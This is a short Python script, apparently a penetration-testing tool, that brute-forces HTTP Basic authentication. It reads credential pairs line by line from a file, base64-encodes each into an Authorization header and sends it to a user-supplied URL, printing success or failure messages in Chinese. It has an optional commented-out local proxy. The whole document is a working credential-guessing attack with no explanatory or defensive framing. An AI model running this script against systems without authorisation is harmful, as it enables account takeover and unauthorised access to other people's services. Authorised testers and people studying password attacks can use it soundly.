import requests
import base64
proxies = {
  # 'http': 'http://127.0.0.1:8080',
  # 'https': 'http://127.0.0.1:8080'
}

url= input('url:')
with open("user_pass.txt","r") as f:
    while True:
        passwd = f.readline()[:-1]
        # print(passwd)
        # 当循环没有结束的时候文件指针会一直变化
        if passwd == "" :
            break
        Authorization = "Basic " + base64.b64encode(passwd.encode("utf-8")).decode("utf-8")
        # print(Authorization)
        header = {
            "Authorization": Authorization
        }
        try:
            res = requests.get(url,headers=header)#, proxies = proxies)
            if res.status_code == 200:
                print("\033[32m[+] 登录成功：{}\033[0m".format(passwd))
                break
            else:
                print("\033[34m[-] 登录失败：{}\033[0m".format(passwd))
        except:
            pass
